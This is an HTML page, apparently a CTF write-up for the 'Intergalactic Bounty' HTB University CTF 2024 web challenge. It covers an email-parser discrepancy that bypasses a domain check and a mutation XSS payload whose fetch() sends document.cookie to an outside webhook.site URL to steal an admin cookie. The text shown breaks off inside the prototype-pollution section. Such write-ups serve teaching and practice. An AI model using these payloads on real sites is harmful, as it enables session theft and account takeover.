@@ -1,0 +1,264 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Intergalactic Bounty: HTB University CTF 2024 · Intergalactic Bounty · xclow3n</title><meta name="description" content="Exploiting Nodemailer parser discrepancies, bypassing HTML sanitization with MXSS, and achieving RCE through prototype pollution file overwrite in this HTB University CTF 2024 challenge."><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=IM+Fell+English:ital@0;1&family=IM+Fell+English+SC&family=Pinyon+Script&family=Alegreya:ital,wght@0,400;0,500;1,400;1,500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"><link rel="stylesheet" href="/_astro/_slug_.DwJ29Fq7.css"></head> <body> <div class="paper"></div> <div class="paper2"></div> <div class="creases"></div> <div class="veil" id="veil"></div> <div class="band top" id="bandTop"><span></span></div> <div class="band bot" id="bandBot"><span></span></div> <header class="chrome"> <a class="brand" href="/">xclow3n<i>the grimoire map</i></a> <div class="r"> <a href="#top">to the top ↑</a> <a href="/">back to map</a> <a href="#" id="themeBtn">day edition</a> </div> </header> <nav class="rail" id="rail" aria-label="Waypoints"> <div class="cap">WAYPOINTS</div> <ol id="railList"> <li><a href="#top" class="active"><span class="n">✦</span><span>The threshold</span></a></li> <li><a href="#intergalactic-bounty-web"><span class="n">I</span><span>Intergalactic Bounty (WEB)</span></a></li><li><a href="#solution"><span class="n">II</span><span>Solution</span></a></li><li><a href="#1-initial-access"><span class="n">III</span><span>1. Initial Access</span></a></li><li><a href="#2-nodemailer-parser-discrepancy"><span class="n">IV</span><span>2. Nodemailer Parser Discrepancy</span></a></li><li><a href="#3-mutation-xss-mxss"><span class="n">V</span><span>3. Mutation XSS (MXSS)</span></a></li><li><a href="#4-prototype-pollution-file-overwrite"><span class="n">VI</span><span>4. Prototype Pollution File Overwri…</span></a></li> </ol> <div id="feet"> <svg width="14" height="16" viewBox="0 0 14 16" fill="currentColor" style="color:var(--ink)"> <ellipse cx="4" cy="5" rx="2.4" ry="3.4" opacity=".9"></ellipse><ellipse cx="4" cy="10.4" rx="1.1" ry="1.2" opacity=".9"></ellipse> <ellipse cx="10" cy="7" rx="2.4" ry="3.4" opacity=".55"></ellipse><ellipse cx="10" cy="12.4" rx="1.1" ry="1.2" opacity=".55"></ellipse> </svg> </div> </nav> <main class="wrap" id="top"> <div class="seal">MY CHALLENGES · NOV 2024 · <a href="/">INTERGALACTIC BOUNTY</a></div> <h1 class="title">Intergalactic Bounty: HTB University CTF 2024</h1> <div class="rule"><span class="ln"></span><span class="fl">✦</span><span class="ln"></span></div> <p class="lede">Exploiting Nodemailer parser discrepancies, bypassing HTML sanitization with MXSS, and achieving RCE through prototype pollution file overwrite in this HTB University CTF 2024 challenge.</p> <div class="tags"><span class="tag">CTF</span><span class="tag">Web</span><span class="tag">Nodemailer</span><span class="tag">MXSS</span><span class="tag">Prototype Pollution</span><span class="tag">RCE</span></div> <div class="thresh"></div> <article class="doc"> <h2 id="intergalactic-bounty-web">Intergalactic Bounty (WEB)</h2>
+<p>In this challenge, we will exploit several vulnerabilities, including inconsistencies in Nodemailer’s email parser, bypassing HTML sanitization using Mutation XSS (MXSS), and achieving Remote Code Execution (RCE) through file overwrite via a prototype pollution gadget chain. Let’s delve into each step of the exploitation process.</p>
+<h2 id="solution">Solution</h2>
+<p>Below is a comprehensive walkthrough of the exploitation process, including code snippets and visual aids to illustrate each step.</p>
+<h2 id="1-initial-access">1. Initial Access</h2>
+<p>Visiting the home page presents the login interface:</p>
+<p><img src="/images/intergalatic/login.png" alt="Login Page"></p>
+<p>Additionally, an email client is available for registration:</p>
+<p><img src="/images/intergalatic/register.png" alt="Email Client"></p>
+<p>Attempting to register with the provided email results in the following error:</p>
+<p><img src="/images/intergalatic/er.png" alt="Registration Error"></p>
+<h2 id="2-nodemailer-parser-discrepancy">2. Nodemailer Parser Discrepancy</h2>
+<p>Examining the <code>package.json</code>, the application uses the latest versions for all packages, indicating no known CVEs. Our first objective is to create an account.</p>
+<p>The registration route is implemented as follows:</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#CB7676">const</span><span style="color:#80A665"> registerAPI</span><span style="color:#444444"> =</span><span style="color:#CB7676"> async</span><span style="color:#444444"> (</span><span style="color:#BD976A">req</span><span style="color:#444444">,</span><span style="color:#BD976A"> res</span><span style="color:#444444">)</span><span style="color:#444444"> =></span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#CB7676">    const</span><span style="color:#444444"> {</span><span style="color:#BD976A"> email</span><span style="color:#444444">,</span><span style="color:#BD976A"> password</span><span style="color:#444444">,</span><span style="color:#BD976A"> role</span><span style="color:#444444"> =</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">guest</span><span style="color:#C98A7D77">"</span><span style="color:#444444"> }</span><span style="color:#444444"> =</span><span style="color:#BD976A"> req</span><span style="color:#444444">.</span><span style="color:#BD976A">body</span><span style="color:#444444">;</span></span>
+<span class="line"><span style="color:#CB7676">    const</span><span style="color:#BD976A"> emailDomain</span><span style="color:#444444"> =</span><span style="color:#BD976A"> emailAddresses</span><span style="color:#444444">.</span><span style="color:#80A665">parseOneAddress</span><span style="color:#444444">(</span><span style="color:#BD976A">email</span><span style="color:#444444">)?.</span><span style="color:#BD976A">domain</span><span style="color:#444444">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#4D9375">    if</span><span style="color:#444444"> (</span><span style="color:#CB7676">!</span><span style="color:#BD976A">emailDomain</span><span style="color:#CB7676"> ||</span><span style="color:#BD976A"> emailDomain</span><span style="color:#CB7676"> !==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">interstellar.htb</span><span style="color:#C98A7D77">'</span><span style="color:#444444">)</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#BD976A"> res</span><span style="color:#444444">.</span><span style="color:#80A665">status</span><span style="color:#444444">(</span><span style="color:#4C9A91">200</span><span style="color:#444444">).</span><span style="color:#80A665">json</span><span style="color:#444444">({</span><span style="color:#B8A965"> message</span><span style="color:#444444">:</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">Registration is not allowed for this email domain</span><span style="color:#C98A7D77">'</span><span style="color:#444444"> });</span></span>
+<span class="line"><span style="color:#444444">    }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#4D9375">    try</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#4D9375">    await</span><span style="color:#BD976A"> User</span><span style="color:#444444">.</span><span style="color:#80A665">createUser</span><span style="color:#444444">(</span><span style="color:#BD976A">email</span><span style="color:#444444">,</span><span style="color:#BD976A"> password</span><span style="color:#444444">,</span><span style="color:#BD976A"> role</span><span style="color:#444444">);</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#BD976A"> res</span><span style="color:#444444">.</span><span style="color:#80A665">json</span><span style="color:#444444">({</span><span style="color:#B8A965"> message</span><span style="color:#444444">:</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">User registered. Verification email sent.</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span><span style="color:#B8A965"> status</span><span style="color:#444444">:</span><span style="color:#4C9A91"> 201</span><span style="color:#444444"> });</span></span>
+<span class="line"><span style="color:#444444">    }</span><span style="color:#4D9375"> catch</span><span style="color:#444444"> (</span><span style="color:#BD976A">err</span><span style="color:#444444">)</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#BD976A"> res</span><span style="color:#444444">.</span><span style="color:#80A665">status</span><span style="color:#444444">(</span><span style="color:#4C9A91">500</span><span style="color:#444444">).</span><span style="color:#80A665">json</span><span style="color:#444444">({</span><span style="color:#B8A965"> message</span><span style="color:#444444">:</span><span style="color:#BD976A"> err</span><span style="color:#444444">.</span><span style="color:#BD976A">message</span><span style="color:#444444">,</span><span style="color:#B8A965"> status</span><span style="color:#444444">:</span><span style="color:#4C9A91"> 500</span><span style="color:#444444"> });</span></span>
+<span class="line"><span style="color:#444444">    }</span></span>
+<span class="line"><span style="color:#444444">};</span></span></code></pre>
+<p>The email domain must be <code>interstellar.htb</code>, and it uses the <code>email-addresses</code> library to parse the email according to RFC 5322.</p>
+<p>Let’s attempt to parse the following string with this library to see what domain we obtain: <code>"\"test\\@example.com> ORCPT=test;admin\"@super.com"</code></p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#CB7676">const</span><span style="color:#BD976A"> emailAddresses</span><span style="color:#444444"> =</span><span style="color:#80A665"> require</span><span style="color:#444444">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">email-addresses</span><span style="color:#C98A7D77">'</span><span style="color:#444444">);</span></span>
+<span class="line"><span style="color:#CB7676">let</span><span style="color:#BD976A"> mail</span><span style="color:#444444"> =</span><span style="color:#C98A7D77"> "</span><span style="color:#C99076">\"</span><span style="color:#C98A7D">test</span><span style="color:#C99076">\\</span><span style="color:#C98A7D">@email.htb x</span><span style="color:#C99076">\"</span><span style="color:#C98A7D">@interstellar.htb</span><span style="color:#C98A7D77">"</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">const</span><span style="color:#BD976A"> parsedEmail</span><span style="color:#444444"> =</span><span style="color:#BD976A"> emailAddresses</span><span style="color:#444444">.</span><span style="color:#80A665">parseOneAddress</span><span style="color:#444444">(</span><span style="color:#BD976A">mail</span><span style="color:#444444">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#4D9375">if</span><span style="color:#444444"> (</span><span style="color:#BD976A">parsedEmail</span><span style="color:#444444">)</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#BD976A">    console</span><span style="color:#444444">.</span><span style="color:#80A665">log</span><span style="color:#444444">(</span><span style="color:#BD976A">parsedEmail</span><span style="color:#444444">);</span></span>
+<span class="line"><span style="color:#444444">}</span><span style="color:#4D9375"> else</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#BD976A">    console</span><span style="color:#444444">.</span><span style="color:#80A665">log</span><span style="color:#444444">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Invalid email address</span><span style="color:#C98A7D77">'</span><span style="color:#444444">);</span></span>
+<span class="line"><span style="color:#444444">}</span></span></code></pre>
+<p>Running this script yields the following output:</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="json"><code><span class="line"><span style="color:#444444">{</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    parts</span><span style="color:#444444">:</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    name</span><span style="color:#444444">:</span><span style="color:#4D9375"> null</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    address</span><span style="color:#444444">:</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">        name</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> 'addr-spec'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">        tokens</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> '</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">test</span><span style="color:#C99076">\\</span><span style="color:#C98A7D">@email.htb x</span><span style="color:#C98A7D77">"</span><span style="color:#FDAEB7;font-style:italic">@super.com'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">        semantic</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> 'test@email.htb</span><span style="color:#FDAEB7;font-style:italic"> x@super.com'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">        children</span><span style="color:#444444">:</span><span style="color:#444444"> [</span><span style="color:#FDAEB7;font-style:italic">Array</span><span style="color:#444444">]</span></span>
+<span class="line"><span style="color:#444444">    },</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    local</span><span style="color:#444444">:</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">        name</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> 'local-part'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">        tokens</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> '</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">test</span><span style="color:#C99076">\\</span><span style="color:#C98A7D">@email.htb x</span><span style="color:#C98A7D77">"</span><span style="color:#FDAEB7;font-style:italic">'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">        semantic</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> 'test@email.htb</span><span style="color:#FDAEB7;font-style:italic"> x'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">        children</span><span style="color:#444444">:</span><span style="color:#444444"> [</span><span style="color:#FDAEB7;font-style:italic">Array</span><span style="color:#444444">]</span></span>
+<span class="line"><span style="color:#444444">    },</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    domain</span><span style="color:#444444">:</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">        name</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> 'domain'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">        tokens</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> 'super.com'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">        semantic</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> 'super.com'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">        children</span><span style="color:#444444">:</span><span style="color:#444444"> [</span><span style="color:#FDAEB7;font-style:italic">Array</span><span style="color:#444444">]</span></span>
+<span class="line"><span style="color:#444444">    },</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    comments</span><span style="color:#444444">:</span><span style="color:#444444"> []</span></span>
+<span class="line"><span style="color:#444444">    },</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    type</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> 'mailbox'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    name</span><span style="color:#444444">:</span><span style="color:#4D9375"> null</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    address</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> 'test@email.htb</span><span style="color:#FDAEB7;font-style:italic"> x@super.com'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    local</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> 'test@email.htb</span><span style="color:#FDAEB7;font-style:italic"> x'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    domain</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> 'super.com'</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    comments</span><span style="color:#444444">:</span><span style="color:#FDAEB7;font-style:italic"> ''</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#FDAEB7;font-style:italic">    groupName</span><span style="color:#444444">:</span><span style="color:#4D9375"> null</span></span>
+<span class="line"><span style="color:#444444">}</span></span></code></pre>
+<p>The domain is identified as <code>super.com</code>. Let’s use this as our email and check if we receive the verification email:</p>
+<p>Email used: <code>"test\@email.htb x"@interstellar.htb</code>, You can read more about how we got this payload from my Nodemailer post</p>
+<p><img src="/images/intergalatic/gotCode.png" alt="Received Verification Code"></p>
+<p>With the verification code, we can now log in:</p>
+<p><img src="/images/intergalatic/logged.png" alt="Logged In"></p>
+<h2 id="3-mutation-xss-mxss">3. Mutation XSS (MXSS)</h2>
+<p>Next, we can create a bounty and report it. Let’s examine the report addition functionality:</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#CB7676">const</span><span style="color:#80A665"> addBountiesAPI</span><span style="color:#444444"> =</span><span style="color:#CB7676"> async</span><span style="color:#444444"> (</span><span style="color:#BD976A">req</span><span style="color:#444444">,</span><span style="color:#BD976A"> res</span><span style="color:#444444">)</span><span style="color:#444444"> =></span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#CB7676">    const</span><span style="color:#444444"> {</span><span style="color:#BD976A"> status</span><span style="color:#444444"> =</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">unapproved</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span><span style="color:#444444"> ...</span><span style="color:#BD976A">bountyData</span><span style="color:#444444"> }</span><span style="color:#444444"> =</span><span style="color:#BD976A"> req</span><span style="color:#444444">.</span><span style="color:#BD976A">body</span><span style="color:#444444">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">    const</span><span style="color:#BD976A"> sanitizedBountyData</span><span style="color:#444444"> =</span><span style="color:#80A665"> sanitizeHTMLContent</span><span style="color:#444444">(</span><span style="color:#BD976A">bountyData</span><span style="color:#444444">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#4D9375">    try</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#CB7676">    const</span><span style="color:#BD976A"> newBounty</span><span style="color:#444444"> =</span><span style="color:#4D9375"> await</span><span style="color:#BD976A"> BountyModel</span><span style="color:#444444">.</span><span style="color:#80A665">create</span><span style="color:#444444">({</span></span>
+<span class="line"><span style="color:#444444">        ...</span><span style="color:#BD976A">sanitizedBountyData</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#BD976A">        status</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#444444">    });</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#BD976A"> res</span><span style="color:#444444">.</span><span style="color:#80A665">status</span><span style="color:#444444">(</span><span style="color:#4C9A91">200</span><span style="color:#444444">).</span><span style="color:#80A665">json</span><span style="color:#444444">({</span><span style="color:#B8A965"> message</span><span style="color:#444444">:</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">OK</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span><span style="color:#B8A965"> data</span><span style="color:#444444">:</span><span style="color:#BD976A"> newBounty</span><span style="color:#444444"> });</span></span>
+<span class="line"><span style="color:#444444">    }</span><span style="color:#4D9375"> catch</span><span style="color:#444444"> (</span><span style="color:#BD976A">err</span><span style="color:#444444">)</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#BD976A"> res</span></span>
+<span class="line"><span style="color:#444444">        .</span><span style="color:#80A665">status</span><span style="color:#444444">(</span><span style="color:#4C9A91">500</span><span style="color:#444444">)</span></span>
+<span class="line"><span style="color:#444444">        .</span><span style="color:#80A665">json</span><span style="color:#444444">({</span><span style="color:#B8A965"> message</span><span style="color:#444444">:</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Error adding bounty</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span><span style="color:#B8A965"> error</span><span style="color:#444444">:</span><span style="color:#BD976A"> err</span><span style="color:#444444">.</span><span style="color:#BD976A">message</span><span style="color:#444444"> });</span></span>
+<span class="line"><span style="color:#444444">    }</span></span>
+<span class="line"><span style="color:#444444">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#CB7676">const</span><span style="color:#80A665"> sanitizeHTMLContent</span><span style="color:#444444"> =</span><span style="color:#444444"> (</span><span style="color:#BD976A">data</span><span style="color:#444444">)</span><span style="color:#444444"> =></span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#BD976A"> Object</span><span style="color:#444444">.</span><span style="color:#80A665">entries</span><span style="color:#444444">(</span><span style="color:#BD976A">data</span><span style="color:#444444">).</span><span style="color:#80A665">reduce</span><span style="color:#444444">((</span><span style="color:#BD976A">acc</span><span style="color:#444444">,</span><span style="color:#444444"> [</span><span style="color:#BD976A">key</span><span style="color:#444444">,</span><span style="color:#BD976A"> value</span><span style="color:#444444">])</span><span style="color:#444444"> =></span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#BD976A">    acc</span><span style="color:#444444">[</span><span style="color:#BD976A">key</span><span style="color:#444444">]</span><span style="color:#444444"> =</span><span style="color:#80A665"> sanitizeHtml</span><span style="color:#444444">(</span><span style="color:#BD976A">value</span><span style="color:#444444">,</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#B8A965">        allowedTags</span><span style="color:#444444">:</span><span style="color:#BD976A"> sanitizeHtml</span><span style="color:#444444">.</span><span style="color:#BD976A">defaults</span><span style="color:#444444">.</span><span style="color:#BD976A">allowedTags</span><span style="color:#444444">.</span><span style="color:#80A665">concat</span><span style="color:#444444">([</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">math</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">style</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">svg</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#444444">        ]),</span></span>
+<span class="line"><span style="color:#B8A965">        allowVulnerableTags</span><span style="color:#444444">:</span><span style="color:#4D9375"> true</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#444444">    });</span></span>
+<span class="line"><span style="color:#4D9375">    return</span><span style="color:#BD976A"> acc</span><span style="color:#444444">;</span></span>
+<span class="line"><span style="color:#444444">    },</span><span style="color:#444444"> {});</span></span>
+<span class="line"><span style="color:#444444">};</span></span></code></pre>
+<p>The application uses the <code>sanitize-html</code> library to sanitize the input, allowing <code>style</code>, <code>math</code>, and <code>svg</code> elements along with the default HTML elements. It also permits vulnerable tags by setting <code>allowVulnerableTags</code> to <code>true</code>, making it susceptible to MXSS.</p>
+<p>By using a payload like the following, we can achieve XSS:</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line"><span style="color:#444444">&#x3C;</span><span style="color:#4D9375">math</span><span style="color:#444444">>&#x3C;</span><span style="color:#FDAEB7">style</span><span style="color:#444444">>&#x3C;</span><span style="color:#FDAEB7">img</span><span style="color:#BD976A"> src</span><span style="color:#444444">=</span><span style="color:#C98A7D">x</span><span style="color:#BD976A"> onerror</span><span style="color:#444444">=</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">fetch('https://webhook.site/757ea325-e795-4446-87a6-72576ee56cd2?x=' + document.cookie)</span><span style="color:#C98A7D77">"</span><span style="color:#444444">></span></span></code></pre>
+<p>This payload allows us to steal the admin’s cookies.</p>
+<p>By adding a bounty with the above payload in the description and reporting our bounty, the admin bot processes it:</p>
+<p><img src="/images/intergalatic/cook.png" alt="Webhook Request for Admin Cookie"></p>
+<p>We successfully obtained the admin cookie.</p>
+<p>Logging in as admin grants access to two new features:</p>
+<p><img src="/images/intergalatic/edi.png" alt="Admin Features - Edit Bounties"></p>
+<p><img src="/images/intergalatic/reqe.png" alt="Admin Features - Send GET Requests"></p>
+<p>The first feature allows editing bounties, and the second feature permits sending GET requests to any URL.</p>
+<h2 id="4-prototype-pollution-file-overwrite">4. Prototype Pollution File Overwrite</h2>
+<p>The edit functionality operates as follows:</p>
+<pre class="astro-code vitesse-black" style="background-color:#000;color:#dbd7cacc; overflow-x: auto;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#CB7676">const</span><span style="color:#80A665"> editBountiesAPI</span><span style="color:#444444"> =</span><span style="color:#CB7676"> async</span><span style="color:#444444"> (</span><span style="color:#BD976A">req</span><span style="color:#444444">,</span><span style="color:#BD976A"> res</span><span style="color:#444444">)</span><span style="color:#444444"> =></span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#CB7676">    const</span><span style="color:#444444"> {</span><span style="color:#444444"> ...</span><span style="color:#BD976A">bountyData</span><span style="color:#444444"> }</span><span style="color:#444444"> =</span><span style="color:#BD976A"> req</span><span style="color:#444444">.</span><span style="color:#BD976A">body</span><span style="color:#444444">;</span></span>
+<span class="line"><span style="color:#4D9375">    try</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#CB7676">    const</span><span style="color:#BD976A"> data</span><span style="color:#444444"> =</span><span style="color:#4D9375"> await</span><span style="color:#BD976A"> BountyModel</span><span style="color:#444444">.</span><span style="color:#80A665">findByPk</span><span style="color:#444444">(</span><span style="color:#BD976A">req</span><span style="color:#444444">.</span><span style="color:#BD976A">params</span><span style="color:#444444">.</span><span style="color:#BD976A">id</span><span style="color:#444444">,</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#B8A965">        attributes</span><span style="color:#444444">:</span><span style="color:#444444"> [</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">target_name</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">target_aliases</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">target_species</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">last_known_location</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">galaxy</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">star_system</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">planet</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">coordinates</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">reward_credits</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">reward_items</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">issuer_name</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">issuer_faction</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">risk_level</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">required_equipment</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">posted_at</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">status</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">image</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">description</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">crimes</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#C98A7D77">        "</span><span style="color:#C98A7D">id</span><span style="color:#C98A7D77">"</span><span style="color:#444444">,</span></span>
+<span class="line"><span style="color:#444444">        ],</span></span>
+<span class="line"><span style="color:#444444">    });</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#4D9375">    if</span><span style="color:#444444"> (</span><span style="color:#CB7676">!</span><span style="color:#BD976A">data</span><span style="color:#444444">)</span><span style="color:#444444"> {</span></span>
+<span class="line"><span style="color:#4D9375">        return</span><span style="color:#BD976A"> res</span><span style="color:#444444">.</span><span style="color:#80A665">status</span><span style="color:#444444">(</span><span style="color:#4C9A91">404</span><span style="color:#444444">).</span><span style="color:#80A665">json</span><span style="color:#444444">({</span><span style="color:#B8A965"> message</span><span style="color:#444444">:</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">Bounty not found</span><span style="color:#C98A7D77">"</span><span style="color:#444444"> });</span></span>
+<span class="line"><span style="color:#444444">    }</span></span>
+<span class="line"></span>
